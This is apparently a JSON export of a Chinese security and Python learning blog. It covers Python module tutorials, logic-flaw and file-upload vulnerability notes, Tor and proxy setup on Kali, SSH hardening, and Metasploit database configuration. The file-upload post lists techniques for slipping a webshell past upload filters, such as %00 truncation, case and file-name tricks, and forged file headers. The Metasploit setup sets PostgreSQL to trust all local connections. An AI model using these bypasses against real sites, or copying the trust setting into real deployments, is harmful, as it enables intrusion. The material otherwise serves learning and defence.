1234567import click@click.command()@click.option('--name','-name',default='johnw')def main(name): print(name) 设置一个参数多个值 其中多个值会被包装成一个tuple 12345import click @click.command()@click.option('--name',nargs=2,type='str')def main(name): print(name) 一个参数设置多个值，并且类型不同 1234567import click@click.command()@click.option('--ops',type=(unicode,int))def main(ops): print(ops) 问答型参数 123456import click@click.command()@click.option(&apos;--name&apos;,prompt=&quot;Your name is : &quot;)def main(name): print(&quot;Hello &quot;,name) 密码型参数 1234567import click@click.command()@click.option(&apos;--password&apos;,prompt=True,hide_input=True,confirmation_prompt=True)def encrypt(password): print(&apos;encrypted password&apos;) 几个参数 default：默认值 type： int,str,float help: 提示信息 reference http://click.pocoo.org/6/options/#basic-value-options","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块-queue","slug":"python/python模块-queue","date":"2018-07-01T15:29:19.000Z","updated":"2018-08-10T13:39:10.076Z","comments":true,"path":"2018/07/01/python/python模块-queue/","link":"","permalink":"http://yoursite.com/2018/07/01/python/python模块-queue/","excerpt":"","text":"概述 上次简单总结了python的多线程模块，这次主要学习一下python的queue模块，仔细通读下来，有两点 在queue模块中，如果你要执行put的操作的时候，如果是多线程，就会比较难办，因为这个时候数据是无序的，机器也没办法知道哪个已经放进去了，哪个还没放进去，会变得混乱 如果是把它拿出来执行，那就很方便，因为这个是在一个队列里面。 下面我们总结一下概念 queue queue实现了三种队列 FIFO： 先进先出 LIFO：后进先出 priority queue：优先值低的先出去，优先值相同的，先进先出 下面通过代码来学习一下队列多线程 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env python#-*- coding:utf-8 -*-from time import ctime,sleepimport threadingimport queue# 首先是先起一个队列q = queue.Queue()def work(i): while True: item = q.get() if item is None: print(\"线程 &#123;&#125; 发现了一个None， 可以休息了. time:&#123;&#125;\".format(i,ctime())) break sleep(0.5) # do some work print(\"线程&#123;&#125;将任务&lt;&#123;&#125;&gt;给完成了。time : &#123;&#125;\".format(i,item,ctime())) q.task_done()# 这里开始往队列里面放东西def producer(): for i in range(10): sleep(0.5) q.put(i) # 开始放，在这里就把需要的资源都放进去了。producer()# 起一个线程池work_threads = []# 其三个线程，加入线程池for i in range(3): work_threads.append(threading.Thread(target=work,args=(i,)))# 线程启动开始消耗for t in work_threads: t.start()# 阻塞队列，直到所有任务都完成了，在开始加入Noneq.join()# 加入None，以便完成任务for i in range(10): q.put(None) # 等待消耗的线程完成for t in work_threads: t.join() 另一种比较简单的写法 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python#-*- coding:utf-8 -*-from time import ctime,sleepimport threadingimport queuefrom datetime import datetimeq = queue.Queue()def work(i): while not q.empty(): item = q.get() #if item is None: #print(\"线程 &#123;&#125; 发现了一个None， 可以休息了. time:&#123;&#125;\".format(i,ctime())) #break sleep(2) # do some work print(\"线程&#123;&#125;将任务&lt;&#123;&#125;&gt;给完成了。time : &#123;&#125;\".format(i,item,ctime())) q.task_done()def producer(): for i in range(10): #sleep(0.5) q.put(i)start = datetime.now() producer()work_threads = [threading.Thread(target=work,args=(i,)) for i in range(10)]for t in work_threads: t.start()for t in work_threads: t.join()end = datetime.now()print(end-start)#0:00:02.008000 总结 理解了多线程+queue，下一篇进行实战！ reference https://www.t00ls.net/articles-44516.html http://www.liujiangblog.com/course/python/59","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"常见的逻辑漏洞","slug":"web_security/常见的逻辑漏洞","date":"2018-06-30T15:52:44.000Z","updated":"2018-08-12T10:11:17.457Z","comments":true,"path":"2018/06/30/web_security/常见的逻辑漏洞/","link":"","permalink":"http://yoursite.com/2018/06/30/web_security/常见的逻辑漏洞/","excerpt":"","text":"逻辑安全存在的前提 有效的区分每个用户，并且针对每个用户提供独立的服务内容，允许用户与服务器进行大量的交互 。web应用的攻击就是攻击者从零交互零权限到最后取得最高权限。以下分别总结几点逻辑安全的漏洞 用户管理功能漏洞 Cookie and Session 最大的漏洞就是避免cookie伪造，例如在cookies中存在一个字段为 admin: false，这个时候，如果黑客将其改为 true，那么就可以实现cookies的一个伪造，从而进行攻击。 用户授权管理和安全分析 授权管理分为以下几个部分 注册 密码找回 登录 密码修改、绑定信息修改 管理权限 下面总结一下，大概有哪些危险 注册 面临的危险和解决方案 恶意重复注册 12345#解决方案限制IP注册频率表单加上验证码姓名和身份证验证二次验证，例如绑定手机号码或者邮箱 注册用户与已经存在的用户重名 123#解决方案首先数据库字段，要加上验证，不允许重复对用户输入要做校验。 没有对用户输入进行校验，造成xss，sql注入 1234#解决方案对用户输入要做校验.过滤特殊字符不使用sql拼接 mysql中，可能存在空格覆盖。 12#解决方案对用户输入要做校验,去除空格。 密码找回 面临的危险和解决方案 服务器没有校验修改密码的token，或者token是可猜测破解的，这回造成任意密码修改【!】。这个是存在最多的漏洞，很常见。 1加强token的安全性 session覆盖攻击,少见，即一个用户的session，会覆盖掉另一个用户的session，导致打开的时候，修改的其实是另一个用户的密码 1很少见，估计实现都有困难。 登录 面临的危险和解决方案 暴力破解用户密码 1使用验证码形式，用户三次输入错误，需要输入验证码，多次输入错误需要绑定的手机或者邮箱进行解锁 明文传输导致中间人攻击 12HTTPSHSTS 万能密码 1做好防止sql注入的漏洞 用户密码存储 1用户密码应该使用hash+随机盐的形式进行存储。 登录提示 1不应该使用过于明显的登录提示 密码修改/个人信息修改 CSRF攻击 1加CSRF token和 refer 进行防御 确认用户本人操作 1需要进行二次验证，确认是本人操作 管理权限漏洞 开发过程中没有对当前用户的一致性做校验工作。例如在flask中，个人中心需要登录才能看，但是如果你忘记了对当前用户的身份做一个校验，那么就会变成，只要随便登录一个用户，那么他就可以随便的修改或者查看他人的个人中心。 代码实例： 12345678910@app.route(&apos;/profile/&lt;username&gt;&apos;)@login_requireddef profile(username): user = User.query.filter_by(username=username).first() # 应该这么校验 if current_user == user: ... else: flash(&quot;You have no permission to access this page.&quot;) return redirect(url_for(&apos;index&apos;)) 权限管理没做好，导致低权限用户可以访问高权限用户的页面。同上，做好权限校验 用户身份识别和安全防护 这章主要讲的是验证码和二次验证码的安全，基本上可以概括为： 无论哪种验证码，都应该要有一个过期时间。 为了保证安全，都不该可以被猜测 总结 下一步打算认认真真研究一下kali这个系统了。","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"逻辑漏洞","slug":"逻辑漏洞","permalink":"http://yoursite.com/tags/逻辑漏洞/"}]},{"title":"python模块-threading","slug":"python/python模块-threading","date":"2018-06-29T11:38:34.000Z","updated":"2018-08-10T13:39:28.262Z","comments":true,"path":"2018/06/29/python/python模块-threading/","link":"","permalink":"http://yoursite.com/2018/06/29/python/python模块-threading/","excerpt":"","text":"概述 众所周知，运行一个程序最重要的是它的执行效率，比如爬虫，要如何节省爬虫的时间，提高爬虫效率是一件很重要的事情。 虽然python的多线程是鸡肋，在任意时间内，只有一个python的解释器在解释python的bytecode。但也不是多线程就是没有用的，我们的代码分为两种，一种是计算密集型，一种是IO密集型，其中计算密集型主要是需要CPU进行大量的计算的，这个时候，python的多线程没什么用，反而可能会比单线程的效率差。而相对于IO密集型的代码，主要瓶颈在于网络的传输，硬盘IO之类的上面，这个时候，使用python多线程就可以提高其效率。 上面的理解可能稍显有些片面，但不管如何，偏底层的东西先做一个了解，先学会一下如何用python写多线程 threading.Thread 以一段代码为例，做一下学习 12345678910111213141516171819202122232425262728293031323334353637383940414243import threadingfrom time import ctime,sleepdef thread1(): for i in range(2): print(\"The thread name is &#123;&#125; and start in &#123;&#125;\".format(threading.current_thread().name,ctime())) sleep(1) print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))def thread2(): for i in range(2): print(\"The thread name is &#123;&#125; and start in &#123;&#125;\".format(threading.current_thread().name,ctime())) sleep(1) print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))if \"__main__\" == __name__: t1 = threading.Thread(target=thread1) t2 = threading.Thread(target=thread2) threads = [] threads.append(t1) threads.append(t2) for t in threads: print(t.daemon) t.start() print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))# result： 最后一个线程退出，用时两秒。'''FalseThe thread name is Thread-1 and start in Fri Jun 29 16:34:43 2018FalseThe thread name is Thread-2 and start in Fri Jun 29 16:34:43 2018The thread name is MainThread and end in Fri Jun 29 16:34:43 2018The thread name is Thread-2 and end in Fri Jun 29 16:34:44 2018The thread name is Thread-1 and end in Fri Jun 29 16:34:44 2018The thread name is Thread-2 and start in Fri Jun 29 16:34:44 2018The thread name is Thread-1 and start in Fri Jun 29 16:34:44 2018The thread name is Thread-2 and end in Fri Jun 29 16:34:45 2018The thread name is Thread-1 and end in Fri Jun 29 16:34:45 2018''' daemon属性 如果你设置一个线程的daemon属性为True的话，说明这个线程是不重要的，整个python的程序无需等待这个线程即可结束。 （注意，很多地方说是主线程结束，但是我实验了一下，主线程已经执行完了，但是其子线程还是会继续执行下去的。） 从代码可见，其daemon属性，从一开始就是False的。 但是如果你将daemon设置为True，那么程序将不会等待，主线程结束，程序就会退出，我们可以试着将代码改为 12345678910111213141516171819202122t1 = threading.Thread(target=thread1,daemon=True)t2 = threading.Thread(target=thread2,daemon=True)threads = []threads.append(t1)threads.append(t2)for t in threads: print(t.daemon) t.start()print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))# result'''TrueThe thread name is Thread-1 and start in Fri Jun 29 16:39:36 2018TrueThe thread name is Thread-2 and start in Fri Jun 29 16:39:36 2018The thread name is MainThread and end in Fri Jun 29 16:39:36 2018''' join方法 官方解释，join方法是用于阻塞线程的，一般要等待当前线程完成，才会进行下一个线程。根据实验，如果你对于每个线程都加一个join方法的话，那么就等于将程序变成了单线程，所以一般只给最后执行的子线程加一个join，这样，主线程就不会提前退出。 每个子线程都加join 1234for t in threads: print(t.daemon) t.start() t.join() 先启动,再遍历子线程加join 123456for t in threads: print(t.daemon) t.start()for t in threads: t.join() start方法 这个方法很直白，就是启动一个线程。 线程类 1234567891011121314151617181920212223242526272829303132333435import threadingfrom time import ctime,sleep# 引入多线程类# 只能重写两个方法，一个__init__ 一个是runclass MyThread(threading.Thread): def run(self): for i in range(2): print(\"The thread name is &#123;&#125; and start in &#123;&#125;\".format(threading.current_thread().name,ctime())) sleep(1) print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))if __name__ == \"__main__\": threads = [] for i in range(2): mt = MyThread() threads.append(mt) for t in threads: t.start() for t in threads: t.join()'''The thread name is Thread-1 and start in Fri Jun 29 17:04:41 2018The thread name is Thread-2 and start in Fri Jun 29 17:04:41 2018The thread name is Thread-1 and end in Fri Jun 29 17:04:42 2018The thread name is Thread-1 and start in Fri Jun 29 17:04:42 2018The thread name is Thread-2 and end in Fri Jun 29 17:04:42 2018The thread name is Thread-2 and start in Fri Jun 29 17:04:42 2018The thread name is Thread-1 and end in Fri Jun 29 17:04:43 2018The thread name is Thread-2 and end in Fri Jun 29 17:04:43 2018''' 总结 以上学习了python多线程的简单用法，实际中用法肯定比较复杂，比如说锁，比如说队列的多线程，还有待探索。","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块-logging","slug":"python/python模块-logging","date":"2018-06-29T11:36:55.000Z","updated":"2018-08-10T13:38:56.846Z","comments":true,"path":"2018/06/29/python/python模块-logging/","link":"","permalink":"http://yoursite.com/2018/06/29/python/python模块-logging/","excerpt":"","text":"工作流 理解log模块，首先应该理解其工作流，下面通过例子来说明其工作流 首先是main.py 123456789101112131415import subimport sub2import loggingimport logging.configfrom config import LOGGINGlogging.config.dictConfig(LOGGING)logger = logging.getLogger(&quot;main&quot;)def main(): sub.sub1() logger.error(&quot;main debug&quot;)if &quot;__main__&quot; == __name__: main() 在这里我们引入了sub 和sub2，先不理会其配置文件，假设已经写好配置文件了。 其次是sub.py 文件 12345import loggingsub_logger = logging.getLogger(&quot;main.sub&quot;)def sub1(): print(&quot;Hello This is sub1&quot;) sub_logger.debug(&quot;This is sub1&quot;) 我们可以看到，如果是多模块引入log机制，可以直接写成 如上面的形式。这种继承机制，让我们可以很方便的复用log. 理解配置文件 配置文件一般有两种： 字典形式 配置文件形式 至于哪种形式更好，就众说纷坛，有说字典形式比较好，因为都是python文件，我们写代码自定义程度更高，一种说配置文件形式其可读性更好。这里没有一个决断，我们首先使用字典形式，用代码来定义配置文件。 在配置文件里面，log有四个类，分别是 formatters handlers filters loggers formatters 首先我们来看一下formatters 12345678910&quot;formatters&quot;:&#123; # 标准模式 &quot;standard&quot;:&#123; &apos;format&apos;:&apos;[%(asctime)s][%(threadName)s:%(thread)d][%(name)s:%(levelname)s(%(lineno)d)]\\n[%(module)s:%(funcName)s]:%(message)s&apos; &#125; # 简单模式 &quot;brief&quot;:&#123; &quot;format&quot;:&apos;[%(message)s]&apos; &#125;&#125; 其中 standard 和 brief 都是我们可以自定义的名字 接下来我们看一下formatters的格式化字符串有哪些，并且分别是什么含义： 123456789101112131415%(name)s Logger的名字%(levelno)s 数字形式的日志级别%(levelname)s 文本形式的日志级别%(pathname)s 调用日志输出函数的模块的完整路径名，可能没有%(filename)s 调用日志输出函数的模块的文件名%(module)s 调用日志输出函数的模块名%(funcName)s 调用日志输出函数的函数名%(lineno)d 调用日志输出函数的语句所在的代码行%(created)f 当前时间，用UNIX标准的表示时间的浮 点数表示%(relativeCreated)d 输出日志信息时的，自Logger创建以 来的毫秒数%(asctime)s 字符串形式的当前时间。默认格式是 “2003-07-08 16:49:45,896”。逗号后面的是毫秒%(thread)d 线程ID。可能没有%(threadName)s 线程名。可能没有%(process)d 进程ID。可能没有%(message)s 用户输出的消息 handlers handlers模块，顾名思义，就是处理log的模块，在这里我们要定义，log的输出是文件形式还是命令行输出形式，文件形式的话，其文件的存储路径，文件大小改如何分割等问题 1234567891011121314151617&quot;handlers&quot;:&#123; &quot;console&quot;:&#123; &apos;level&apos;:&apos;DEBUG&apos;, #输出信息的最低级别 &apos;class&apos;:&apos;logging.StreamHandler&apos;, &apos;formatter&apos;:&apos;standard&apos;, #使用standard格式 &apos;filters&apos;: [&apos;require_debug_true&apos;,], #仅当 DEBUG = True 该处理器才生效,一般没用。 &#125;, &apos;log&apos;:&#123; &apos;level&apos;:&apos;DEBUG&apos;, &apos;class&apos;:&apos;logging.handlers.RotatingFileHandler&apos;, &apos;formatter&apos;:&apos;standard&apos;, &apos;filename&apos;:os.path.join(BASE_DIR, &apos;debug.log&apos;), #输出位置 &apos;maxBytes&apos;:1024*1024*5, #文件大小 5M &apos;backupCount&apos;: 5, #备份份数 &apos;encoding&apos;: &apos;utf8&apos;, #文件编码 &#125;,&#125; 同理，这里的console和log也是我们自定义的名字，我们还可以定义其他的，然后选择日志的输出位置，或者设置变量为日志的输出位置 loggers loggers是日志的全局管理器，我们会在这里定义一个管理器，在后面调用的时候，我们要获得这个管理器的名字。 123456789# 日志管理器集合 &apos;loggers&apos;:&#123; #管理器 &quot;main&quot;:&#123; &apos;handlers&apos;:[&apos;console&apos;, &apos;main_log&apos;], &apos;level&apos;:&apos;DEBUG&apos;, &apos;propagate&apos;:True, #是否传递给父记录器 &#125;, &#125; 其中 main 是我们自己定义的名字，需要注意的是，如果使用的logger没有在这里定义名字，那么这些配置将无用。 调用logger 这里其实也是前面有提到的东西，我们要引入logging和logging.config。（注意，不能只单纯引入logging，会报错） 在main.py中我们 这么引用 12345import loggingimport logging.configfrom config import LOGGINGlogging.config.dictConfig(LOGGING)logger = logging.getLogger(&quot;main&quot; 其中这个main 就是我们定义在配置文件中管理器的main 根据其工作流原理，其自模块也需要进行log记录，这个时候我们就不需要写配置文件了，直接使用这个配置文件即可 在sub.py中 12345import loggingsub_logger = logging.getLogger(&quot;main.sub&quot;)def sub1(): print(&quot;Hello This is sub1&quot;) sub_logger.debug(&quot;This is sub1&quot;) 总结 就这样，我们模拟了如何在python中使用日志记录，这对于开发来说是一件提高效率和产品质量很重要的事情 代码地址 https://github.com/TheFifthMan/python_modules reference http://yshblog.com/blog/125 https://segmentfault.com/a/1190000015143449","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"kali下使用Tor网络","slug":"kali/kali下使用Tor网络","date":"2018-06-27T15:22:42.000Z","updated":"2018-08-12T10:08:39.530Z","comments":true,"path":"2018/06/27/kali/kali下使用Tor网络/","link":"","permalink":"http://yoursite.com/2018/06/27/kali/kali下使用Tor网络/","excerpt":"","text":"概述 记录一下如何在命令行下面使用tor网络 Kali下安装tor 1apt-get install tor 架梯子 1nohup sslocal -c ss.json 编辑tor配置,添加 12345678910cp /etc/tor/torrc /etc/tor/torrc.backupvim /etc/tor/torrc在里面添加...RunAsDaemon 1Socks5Proxy 127.0.0.1:1080# 重点，每隔n时间进行ip更换，时间单位为秒MaxCircuitDirtiness 900... 启动 1service tor@default start 问题 1234567891011121、创建一个用户，运行tor；2、编辑“start-tor-browser”文件，找到下面语句，删除或注释掉即可运行：#if [ “`id -u`” -eq 0 ]; then# complain “The Tor Browser Bundle should not be run as root. Exiting.”# exit 1#fi 关闭 1service tor@default stop 配置全局代理 1127.0.0.1:9050 总结 完成这一切的前提，是你有一个梯子… Reference https://evi1cg.me/archives/Tor_Fronting.html http://www.cnblogs.com/iamstudy/articles/tor_usage_in_pentest.html","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"文件上传漏洞-理论","slug":"web_security/文件上传漏洞-理论","date":"2018-06-25T16:09:00.000Z","updated":"2018-08-12T10:11:00.537Z","comments":true,"path":"2018/06/26/web_security/文件上传漏洞-理论/","link":"","permalink":"http://yoursite.com/2018/06/26/web_security/文件上传漏洞-理论/","excerpt":"","text":"概念 攻击者利用web应用对上传文件过滤不严的漏洞，将应用程序不该允许的文件类型上传到web服务器上，并成功解析。 文件上传攻击的前提 网站具有上传功能 上传的文件能够被web服务器解析并执行 知道上传后的文件路径和文件名称 目标文件可以呗用户访问 文件上传漏洞的攻与防 攻击 判断是否为js防护或者MIME防护 1使用burp suite抓取流量，进行伪造后重放攻击 针对黑名单过滤 1234561. 多次测试过滤文件名。例如php，php4，php52. 判断大小写绕过。Php，PHP3. 特殊文件名构造：php.shell. , php.shell_4. %00 截断。 phpshell.php%00.jpg5. 考虑web中间件版本漏洞。如httpd，tomcat，nginx,struts2等6. 如果web服务器是检测文件内容的，那么就可以使用修改文件头进行上传webshell 防御 前端进行js防御 [可绕过] 后端进行MIME防御 [可绕过] 后端进行白名单防御 只允许相应格式的文件进行上传，其余格式的文件丢弃 后端黑名单过滤 [可绕过] 不允许相应格式的文件进行上传 文件重命名防御 将用户上传的文件进行重命名，防止截断和绕过 文件名不该含有特殊符号，防止xss之类的攻击 文件内容检测。[可绕过] 有些图像文件，如果以网页脚本形式进行展示的话，那么就可能执行木马。针对文件内容进行检测，必要时候可以使用图像二次渲染之类的技术进行防护。 文件名长度需要做限制 需要有三个文件夹，一个存放临时文件，一个存放正式文件，一个存放病毒文件，并且其上传的文件都不应该具有x权限 用户上传文件后应该经过杀毒软件的扫描，如果是病毒文件，应该放置到隔离的文件中，做为审计资料，如果不是，应该由临时文件夹移动到正式文件夹","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://yoursite.com/tags/文件上传/"}]},{"title":"Kali下配置ss服务","slug":"kali/Kali下配置ss服务","date":"2018-06-25T14:17:29.000Z","updated":"2018-08-12T10:08:42.941Z","comments":true,"path":"2018/06/25/kali/Kali下配置ss服务/","link":"","permalink":"http://yoursite.com/2018/06/25/kali/Kali下配置ss服务/","excerpt":"","text":"步骤 首先你必须要有一个ss服务器 安装shadowsocks 1pip install shadowsocks 修改python包错误 123456789vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py将第52行libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)改为libcrypto.EVP_CIPHER_CTX_reset.argtypes = (c_void_p,)再次搜索cleanup（全文件共2处，此处位于111行），将libcrypto.EVP_CIPHER_CTX_cleanup(self._ctx)改为libcrypto.EVP_CIPHER_CTX_reset(self._ctx)save and restart shadowsocks service 增加ss服务器配置 12345678910&#123; &quot;server&quot;:&quot;服务器地址&quot;, &quot;server_port&quot;:服务器端口号, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, password&quot;:&quot;密码&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;加密方式&quot;, &quot;fast_open&quot;: true, &quot;workers&quot;: 1&#125; 启动服务 1sslocal -c /etc/shadowsocks.json 配置 /etc/proxychains.conf 12socks5 127.0.0.1 1080 使用proxychains启动应用程序 12proxychains firefox www.google.comproxychains msfconsole","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"4-Linux的远程认证","slug":"linux_security/4-Linux的远程认证","date":"2018-06-24T07:35:37.000Z","updated":"2018-06-24T07:39:16.221Z","comments":true,"path":"2018/06/24/linux_security/4-Linux的远程认证/","link":"","permalink":"http://yoursite.com/2018/06/24/linux_security/4-Linux的远程认证/","excerpt":"","text":"增强ssh安全性 改变ssh的端口 1234567cp /ect/ssh/sshd_onfig /etc/ssh/sshd_config.backupvim /etc/ssh/sshd_config...Port 3333service sshd restart 禁止root直接登录 12345vim /etc/ssh/sshd_config...PermissionRootLogin no...service sshd restart 只允许一部分用户登录 123456vim /etc/ssh/sshd_config...AllowUsers user1 user2...service sshd restart 使用密钥登录服务器 123456781. 首先在本地生成一个私钥和公钥。客户端ssh-keygen-t rsa2. 将客户端的公钥上传到服务器端ssh-copy-id -p 33 linux@172.16.190.9013. 登录ssh -p 33 linux@172.111.111.111 禁止密码登录 123456vim /etc/ssh/sshd_config...PasswordAuthentication no...service sshd restart","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"3-Linux的本地认证","slug":"linux_security/3-Linux的本地认证","date":"2018-06-24T07:35:11.000Z","updated":"2018-06-24T07:36:23.439Z","comments":true,"path":"2018/06/24/linux_security/3-Linux的本地认证/","link":"","permalink":"http://yoursite.com/2018/06/24/linux_security/3-Linux的本地认证/","excerpt":"","text":"概述 [x] 用户认证和日志记录 [x] 限制用户登录的能力 [x] 使用acct监视用户行为 [x] 定义用户授权控制 [ ] 使用USB设备和PAM进行登录 日志记录 /var/log 存放着各种log 查看特定账号的错误登录尝试 1lastb root 查看内存中缓存的内核信息 1dmesg 查看最近某用户登录信息 1last 查看最后一次登录 1lastlog 限制用户登录 123456usermod -s /usr/bim/nologin user1passwd -l user1usermod -l user1# 解锁passwd -u user1usermod -u user1 使用acct监视用户 1234apt-get install acct查询特定用户执行过的命令lastcomm root 定义用户用户授权限制 123vim sudoers# 每次切换root权限都需要输入密码Defaults user1 timestamp_timeout=0 总结 这章，比较没写什么有价值的东西。单纯了解了一些linux的操作。","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"2-本地文件系统安全","slug":"linux_security/2-本地文件系统安全","date":"2018-06-24T04:33:17.000Z","updated":"2018-06-24T04:39:13.889Z","comments":true,"path":"2018/06/24/linux_security/2-本地文件系统安全/","link":"","permalink":"http://yoursite.com/2018/06/24/linux_security/2-本地文件系统安全/","excerpt":"","text":"概述 [x] 使用chmod命令改变文件权限 [x] 使用访问控制列表 [ ] 在Ubuntu上安装一个LDAP chmod命令 除了以下的方式外，还可以使用八进制的方式来做权限控制，暂且不表。 命令参数 12345678u 代表文件或者目录的所有者 usersg 代表文件或者目录所属的组 groupso 代表文件或者目录外的其他 othersa 代表以上所有 allr 代表 读x 代表 执行w 代表 写 例子 123456789101112# 新建文件&gt;&gt; touch test.txt# 赋予执行的权限&gt;&gt; chmod u+x test.txt# 赋予组成员执行权限&gt;&gt; chmod g+x u+x test.txt# 收回权限&gt;&gt; chmod u-x test.txt# 将某个文件的权限复制给另一个文件&gt;&gt; chmod --reference=file1 file2# 递归添加权限&gt;&gt; chmod o+x -R /example 使用访问控制列表 获取权限控制信息 12345678linux@linux:~$ getfacl /usrgetfacl: Removing leading &apos;/&apos; from absolute path names# file: usr# owner: root# group: rootuser::rwxgroup::r-xother::r-x 操作指南 添加用户+组 123456789101112useradd user1useradd user2useradd user3passwd -d user1passwd -d user2passwd -d user3addgroup group1usermod -G group1 user1usermod -G group1 user2usermod -G group1 user3 user1 想把文件夹user1 分享给user2，但是不给user3 1234567mkdir accountschown user1 accountssu user1setfacl -m u:user1:rxw accountssetfacl -m u:user2:rwx accountssetfacl -m other:--- accounts 实验验证 123456root@linux:~# su user3$ cd /example$ lsaccounts$ cd accountssh: 3: cd: can&apos;t cd to accounts 对权限控制做备份 1234$ getfacl -R accounts &gt; accounts/permissions.acl $ cd accounts$ lspermissions.acl 恢复备份 1setfacl -- restore=permission.acl 总结 LADP暂时用不到，先不弄了。","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"1-Linux中的安全问题","slug":"linux_security/1-Linux中的安全问题","date":"2018-06-24T02:04:07.000Z","updated":"2018-06-24T04:39:00.487Z","comments":true,"path":"2018/06/24/linux_security/1-Linux中的安全问题/","link":"","permalink":"http://yoursite.com/2018/06/24/linux_security/1-Linux中的安全问题/","excerpt":"","text":"概述 读书笔记 Linux的安全策略 对系统的访问能力 系统上安装软件的权限 数据的访问能力 故障恢复 检验安装介质的安全性 1234567891011121314# Linuxmd5sum ubuntu18.iso# windows CertUtil -hashfile xxxx.iso MD5# mac~/Downloads» md5 ubuntu18.iso MD5 (ubuntu18.iso) = 129292a182136a35e1f89c586dbac2e2---------------------------------官网md5：129292a182136a35e1f89c586dbac2e2 *ubuntu-18.04-desktop-amd64.iso 配置sudo访问 1234567891011useradd testgroupadd testgroupspasswd testvisudo ## Allow people in group test run all commandstest ALL=(ALL) ALLusermod -aG testgroups testsudo test - 使用namp扫描metasploitable2 12345# 首先下载metasploitable2https://sourceforge.net/projects/metasploitable/ # 安装kali系统# 设置kali系统的metasploitable# 使用进行扫描","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"0X001-msf环境配置","slug":"metasploit/0x001-msf环境配置","date":"2018-06-24T01:54:59.000Z","updated":"2018-08-12T10:00:53.518Z","comments":true,"path":"2018/06/24/metasploit/0x001-msf环境配置/","link":"","permalink":"http://yoursite.com/2018/06/24/metasploit/0x001-msf环境配置/","excerpt":"","text":"安装Kali系统 推荐使用虚拟机，太简单不赘述。 配置数据库 开启开机启动 12vim /etc/rc.local 添加/etc/init.d/postgresql start 启动数据库 12service postgresql start systemctl restart postgresql 创建新用户 1234&gt;&gt; su postgres&gt;&gt; pssql&gt;&gt; create user &quot;msfuser&quot; with password &apos;msfpassword&apos; nocreatedb;&gt;&gt; create database &quot;msfdb&quot; with owner=&quot;msfuser&quot;; 编辑database.yml文件 12345678&gt;&gt;cd /usr/share/metasploit-framework/config&gt;&gt; cp database.yml.example database.yml&gt;&gt; vim database.yml...database: msfdbusername: msfuserpassword:msfpassword... 编辑postgresql，本地启动 1234567891011121314&gt;&gt; cd /etc/postgresql/10/main&gt;&gt; cp pg_hba.conf pg_hba.conf.backup&gt;&gt; vim pg_hba.conf...# TYPE DATABASE USER ADDRESS METHOD# &quot;local&quot; is for Unix domain socket connections onlylocal all all trust# IPv4 local connections:host all all 127.0.0.1/32 trust# IPv6 local connections:host all all ::1/128 trust... 启动msf,查看状态 12&gt;&gt; msfconsole&gt;&gt; db_status Reference https://www.secpulse.com/archives/33281.html https://www.jianshu.com/p/9c82ccb2aaf7 https://blog.csdn.net/sanbingyutuoniao123/article/details/52209653 https://docs.kali.org/general-use/starting-metasploit-framework-in-kali","categories":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/categories/metasploit/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/tags/metasploit/"}]},{"title":"执行XSS代码","slug":"web_security/执行XSS代码","date":"2018-06-23T07:50:19.000Z","updated":"2018-08-12T10:11:07.050Z","comments":true,"path":"2018/06/23/web_security/执行XSS代码/","link":"","permalink":"http://yoursite.com/2018/06/23/web_security/执行XSS代码/","excerpt":"","text":"概述 